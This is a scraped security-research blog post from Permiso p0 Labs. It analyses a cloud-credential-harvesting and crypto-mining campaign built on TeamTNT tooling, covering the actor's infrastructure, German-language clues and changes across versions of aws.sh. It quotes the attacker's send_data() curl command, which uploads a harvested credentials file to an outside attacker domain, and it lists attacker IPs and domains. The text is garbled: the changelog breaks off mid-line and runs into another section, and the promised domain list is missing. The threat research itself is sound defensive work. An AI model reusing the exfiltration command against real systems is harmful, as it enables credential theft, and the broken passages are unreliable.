          <h1 class="custom-post-title"><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Agile Approach to mass cloud credential harvesting and crypto mining sprints ahead</span> </h1>

          <div class="custom-post-social-wrap">
            <div class="custom-post-social">
              <ul class="social-icons">
                <li class="facebook">

              <div id="hs_cos_wrapper_full-width-email-signup" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="full-width-content full-width-email">
  <div class="content-wrapper">
    <div class="page-center small full-width-email-inner">
      <div class="full-width-email-text">
              <h1>
        Hear Ye, Hear Ye
      </h1>
      <p>Subscribe to Cloud Chronicles for the latest in cloud security!</p>
      </div>
      <div class="full-width-email-form">
              <span id="hs_cos_wrapper_full-width-email-signup_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_form" style="" data-hs-cos-general-type="widget" data-hs-cos-type="form"><h3 id="hs_cos_wrapper_full-width-email-signup__title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text"></h3>

<div id="hs_form_target_full-width-email-signup_"></div>









</span>
      </div>


    </div>
  </div>
</div></div>
            </div>
            
            <div class="blog-post__body">
              <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h1>Summary</h1>
<p>Developers are not the only people who have adopted the agile methodology for their development processes. From 2023-06-15 to 2023-07-11, Permiso Security’s p0 Labs team identified and tracked an attacker developing and deploying eight (8) incremental iterations of their credential harvesting malware while continuing to develop infrastructure for an upcoming (spoiler: now launched) campaign targeting various cloud services.</p>
<!--more-->
<p>While last week Aqua Security published a blog (<a href="https://blog.aquasec.com/threat-alert-anatomy-of-silentbobs-cloud-attack" target="_blank" rel="noopener noreferrer">https://blog.aquasec.com/threat-alert-anatomy-of-silentbobs-cloud-attack</a>) detailing this under-development campaign’s stages related to infected Docker images, today<span>&nbsp;</span><a href="https://permiso.io/p0-labs/" target="_blank" rel="noopener noreferrer">Permiso p0 Labs</a><span>&nbsp;</span>and<span>&nbsp;</span><a href="https://s1.ai/cloudcreds" target="_blank" rel="noopener noreferrer">SentinelLabs</a><span>&nbsp;</span>are releasing joint research highlighting the incremental updates to the cloud credential harvesting malware samples systematically collected by monitoring the attacker’s infrastructure. So get out of your seats and enjoy this scrum meeting stand-up dedicated to sharing knowledge about this actors campaign and the tooling they will use to steal more cloud credentials.</p>
<p>If you like IDA screenshots in your analysis blogs, be sure to check out<span>&nbsp;</span><a href="https://s1.ai/cloudcreds" target="_blank" rel="noopener noreferrer">SentinelLabs' take on this campaign</a>!</p>
<h1>Previous Campaigns</h1>
<p>There have been many campaigns where actors have used similar tooling to perform cloud credential scraping while also mass deploying crypto mining software. As a refresher, in December, the Permiso team reported the details of an actor<span>&nbsp;</span><a href="https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/" target="_blank" rel="noopener noreferrer">targeting public facing Juptyer Notebooks</a><span>&nbsp;</span>with this toolset.</p>
<p>Our friends over at Cado have also reported extensively on<span>&nbsp;</span><a href="https://www.cadosecurity.com/team-tnt-the-first-crypto-mining-worm-to-steal-aws-credentials/" target="_blank" rel="noopener noreferrer">previous campaigns</a>.</p>
<h1>Active Campaign</h1>
<p>On 2023-07-11, while we were preparing the release of this blog about the in-development toolset, the actor kicked off their campaign.</p>
<p><img src="https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=2181&amp;height=2045&amp;name=silentbob_campaign.png" alt="silentbob_campaign" width="2181" height="2045" loading="lazy" style="height: auto; max-width: 100%; width: 2181px;" srcset="https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=1091&amp;height=1023&amp;name=silentbob_campaign.png 1091w, https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=2181&amp;height=2045&amp;name=silentbob_campaign.png 2181w, https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=3272&amp;height=3068&amp;name=silentbob_campaign.png 3272w, https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=4362&amp;height=4090&amp;name=silentbob_campaign.png 4362w, https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=5453&amp;height=5113&amp;name=silentbob_campaign.png 5453w, https://permiso.io/hs-fs/hubfs/silentbob_campaign.png?width=6543&amp;height=6135&amp;name=silentbob_campaign.png 6543w" sizes="(max-width: 2181px) 100vw, 2181px"></p>
<div data-slate-node="element"><span data-slate-node="text"><br>The file </span><span data-slate-node="text"><code data-slate-leaf="true">b.sh</code></span><span data-slate-node="text"> is the initializing script that downloads and deploys the full tool suite functionality. The main features are to install a backdoor for continued access, deploy crypto mining utilities, and search for and spread to other vulnerable systems.<br><br></span></div>
<div data-slate-node="element" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMlRoZSUyMGZpbGUlMjAlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMmIuc2glMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIyY29kZSUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJTIwaXMlMjB0aGUlMjBpbml0aWFsaXppbmclMjBzY3JpcHQlMjB0aGF0JTIwZG93bmxvYWRzJTIwYW5kJTIwZGVwbG95cyUyMHRoZSUyMGZ1bGwlMjB0b29sJTIwc3VpdGUlMjBmdW5jdGlvbmFsaXR5LiUyMFRoZSUyMG1haW4lMjBmZWF0dXJlcyUyMGFyZSUyMHRvJTIwaW5zdGFsbCUyMGElMjBiYWNrZG9vciUyMGZvciUyMGNvbnRpbnVlZCUyMGFjY2VzcyUyQyUyMGRlcGxveSUyMGNyeXB0byUyMG1pbmluZyUyMHV0aWxpdGllcyUyQyUyMGFuZCUyMHNlYXJjaCUyMGZvciUyMGFuZCUyMHNwcmVhZCUyMHRvJTIwb3RoZXIlMjB2dWxuZXJhYmxlJTIwc3lzdGVtcy4lMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTVEJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTJDJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMkN1cnJlbnRseSUyMCgyMDIzLTA3LTEyKSUyQyUyMHRoZXJlJTIwYXJlJTIwMzklMjBjb21wcm9taXNlZCUyMHN5c3RlbXMlMjBpbiUyMHRoaXMlMjBjYW1wYWlnbiUzQSUyMiUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQ="><span data-slate-node="text">Currently (2023-07-12), there are 39 compromised systems in this campaign:</span></div>

<h1 data-slate-node="element"><span data-slate-node="text">What’s New?</span></h1>
<div data-slate-node="element"><span data-slate-node="text">The cloud credential harvesting utilities in this campaign have some notable differences from previous versions. The following are the highlights of the modifications:</span></div>
<ul data-slate-node="element" zQSUyMmxpc3QtaXRlbSUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMk5ldyUyMEN1cmwlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJTNBJTIwU2hpZnRlZCUyMGZyb20lMjBkbG9hZCUyMGZ1bmN0aW9uJTIwKCVFMiU4MCU5RGN1cmwlMjB3aXRob3V0JTIwY3VybCVFMiU4MCU5RCklMjB0byUyMGRvd25sb2FkaW5nJTIwc3RhZ2VkJTIwY3VybCUyMGJpbmFyeSUyMHRvJTIwZXZlbnR1YWxseSUyMHVzaW5nJTIwdGhlJTIwbmF0aXZlJTIwY3VybCUyMGJpbmFyeS4lMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTVEJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTVEJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTJDJTdCJTIydHlwZSUyMiUzQSUyMmxpc3QtaXRlbSUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMkFXUy1DTEklMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJTNBJTIwJTIyJTJDJTIyZGF0YSUyMiUzQSU3QiU3RCU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJhd3MlMjBzdHMlMjBnZXQtY2FsbGVyLWlkZW50aXR5JTIyJTJDJTIyZGF0YSUyMiUzQSU3QiU3RCUyQyUyMmNvZGUlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiUyMGZvciUyMHZhbGlkYXRpbmclMjBjbG91ZCUyMGNyZWRlbnRpYWxzJTJDJTIwYW5kJTIwaWRlbnRpdHklMjBpbmZvcm1hdGlvbiUyMiUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQ=">
<li data-slate-node="element">
<p><strong>Infrastructure</strong>: Most previous campaigns hosted utilities and C2 on a single domain. In this campaign the actor is utilizing multiple FQDNs (including noteworthy masquerade as EC2 Instance:<span>&nbsp;</span><code>ap-northeast-1.compute.internal.anondns[.]net</code>).</p>
<ul>
<li>
<p>Numerous elements of the actor’s infrastructure and code give weight to the author being a native German speaker (in addition to the fact that the open source TeamTNT tooling already has many German elements in its code).</p>
<ul>
<li>
<p>One of the intermediate versions of<span>&nbsp;</span><code>aws.sh</code><span>&nbsp;</span>referenced the FQDN<span>&nbsp;</span><code>ap-northeast-1.compute.internal.anondns[.]net</code><span>&nbsp;</span>, which returned the German error message<span>&nbsp;</span><code>Fehler! vergleiche bitte die Authentifizierungsmerkmale in beiden Scripten!!!</code><span>&nbsp;</span>(which translates to<span>&nbsp;</span><code>Error! please compare the authentication features in both scripts!!</code>) when visited by a VirusTotal scan on 2023-06-23:</p>
<br><br><img src="https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=1886&amp;height=1168&amp;name=silentbob_vt_1.png" alt="silentbob_vt_1" width="1886" height="1168" loading="lazy" style="height: auto; max-width: 100%; width: 1886px;" srcset="https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=943&amp;height=584&amp;name=silentbob_vt_1.png 943w, https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=1886&amp;height=1168&amp;name=silentbob_vt_1.png 1886w, https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=2829&amp;height=1752&amp;name=silentbob_vt_1.png 2829w, https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=3772&amp;height=2336&amp;name=silentbob_vt_1.png 3772w, https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=4715&amp;height=2920&amp;name=silentbob_vt_1.png 4715w, https://permiso.io/hs-fs/hubfs/silentbob_vt_1.png?width=5658&amp;height=3504&amp;name=silentbob_vt_1.png 5658w" sizes="(max-width: 1886px) 100vw, 1886px"></li>
<li><span>A Google search for the above error message reveals a single hit from a German forum from 2008-10-08 (</span><a href="https://administrator.de/tutorial/upload-von-dateien-per-batch-curl-und-php-auf-einen-webserver-ohne-ftp-98399.html" target="_blank" rel="noopener noreferrer">https://administrator.de/tutorial/upload-von-dateien-per-batch-curl-und-php-auf-einen-webserver-ohne-ftp-98399.html</a><span>) containing code for a PHP file uploader called upload.php where the failed authentication else block echo’s the exact error statement. The filename upload.php was also the URI for the threat actor’s aws.sh versions 2 and 3, and the attacker’s curl command (shown next) contains unique argument syntax identical to the example command in the same forum post.<br><img src="https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=1774&amp;height=1408&amp;name=silentbob_german.png" alt="silentbob_german" width="1774" height="1408" loading="lazy" style="height: auto; max-width: 100%; width: 1774px;" srcset="https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=887&amp;height=704&amp;name=silentbob_german.png 887w, https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=1774&amp;height=1408&amp;name=silentbob_german.png 1774w, https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=2661&amp;height=2112&amp;name=silentbob_german.png 2661w, https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=3548&amp;height=2816&amp;name=silentbob_german.png 3548w, https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=4435&amp;height=3520&amp;name=silentbob_german.png 4435w, https://permiso.io/hs-fs/hubfs/silentbob_german.png?width=5322&amp;height=4224&amp;name=silentbob_german.png 5322w" sizes="(max-width: 1774px) 100vw, 1774px"><br><br></span></li>
<li><span>The last German nods are in the curl command arguments. The more blatant indicator is the argument Datei= in aws.sh versions 2-8 since ”Datei” is the German word for “file”. The more subtle observation is in the hardcoded password (oeireopüigreigroei) in aws.sh versions 2 and 3, specifically the presence of the only non-Latin character: ü.</span></li>
</ul>
<div class="custom-code">
<pre><code><span style="color: #361292;">send_data</span><span>(){<br></span><span>curl -F </span><span>"username=jegjrlgjhdsgjh"</span><span> -F </span><span>"password=oeireopüigreigroei"</span><span> -F \\<br></span><span></span><span>"Datei=@"</span><span>$CSOF</span><span>""</span><span> -F </span><span>"Send=1"</span><span> &lt;http://everlost.anondns.net/upload.php&gt;<br></span>}</code></pre>
</div>
<span></span></li>
</ul>
<br><span>Both the username and password are indicative of a keyboard run - the username on the home row keys and the password on the upper row keys. However, with all other characters being Latin the likely scenario that would produce a single ü is the usage of a virtual keyboard. Since the ü immediately follows the letter p in the password, the only two virtual keyboard layouts that contain an ü adjacent to the p character are for the Estonian and German languages.</span></li>
</ul>
<br><span></span><br>
<h1>Attacker Development LifeCycle</h1>
<p>Monitoring this attacker infrastructure over the course of a month has provided the Permiso team insight into the actor’s development process and the modifications made throughout each iteration. What better way to display than with a changelog! The following is a changelog of the incremental updates made to the credential harvesting utility aws.sh:</p>
<span></span></li>
</ul>
<div class="custom-code">
<pre><code><span># v1(28165d28693ca807fb3d4568624c5ba9) -&gt; v2(b9113ccc0856e5d44bab8d3374362a06)<br></span>[*] updated function name from int_main() to run_aws_grabber() (though not executed in with similar functionality<br>[*] split env_aws() function's logic into three (3) new functions: get_aws_infos(), get_aws_meta(), get_aws_env()<br>[+] added function get_awscli_data() which executes <h1>Attacker Infrastructure</h1>
<p>Actors using modified TeamTNT Tooling like this have a propensity for using the hosting service<span>&nbsp;</span><code>Nice VPS</code><span>&nbsp;</span>. This campaign is no exception in that regard. The actor has registered at least four (4) domains for this campaign through<span>&nbsp;</span><code>anondns</code><span>&nbsp;</span>, all but one currently pointed to the<span>&nbsp;</span><code>Nice VPS</code><span>&nbsp;</span>IP address<span>&nbsp;</span><code>45.9.148.108</code>. The domain<span>&nbsp;</span><code>everfound.anondns.net</code><span>&nbsp;</span>currently resolves to the IP address<span>&nbsp;</span><code>207.154.218.221</code></p>
<p>The domains currently involved in this campaign are:</p>

  var linkAnchor =  document.querySelectorAll('a[href*="#"]');
  Array.prototype.slice.call(linkAnchor).forEach(function(ele, index) {
    ele.addEventListener('click', function(e) {
      var headerWrap = document.querySelector('.header .primary-section');
      var href = this.getAttribute("href");
      var getHash = href.split('#')[1];
      var elem = document.querySelector("#"+getHash);

      if(headerWrap){
        var headerHeight = headerWrap.offsetHeight;
        var newOff =  elem.offsetTop - headerHeight - 10;
      }
      else{
        var newOff =  elem.offsetTop + 94;
      }
      smoothScrollBackToTop(e, newOff);
      e.stopPropagation();
      e.preventDefault();
    });
  });

  function smoothScrollBackToTop(e, targetPos=0) {
    e.preventDefault();
    var targetPosition = targetPos;
    var startPosition = window.pageYOffset;
    var distance = targetPosition - startPosition;
    var duration = 750;
    var start = null;
    window.requestAnimationFrame(step);
    function step(timestamp) {
      if (!start) start = timestamp;
      var progress = timestamp - start;
      window.scrollTo(0, easeInOutCubic(progress, startPosition, distance, duration));
      if (progress < duration) window.requestAnimationFrame(step);
    }
  }
  function easeInOutCubic(t, b, c, d) {
    t /= d/2;
    if (t < 1) return c/2*t*t*t + b;
    t -= 2;
    return c/2*(t*t*t + 2) + b;
  };


</script>
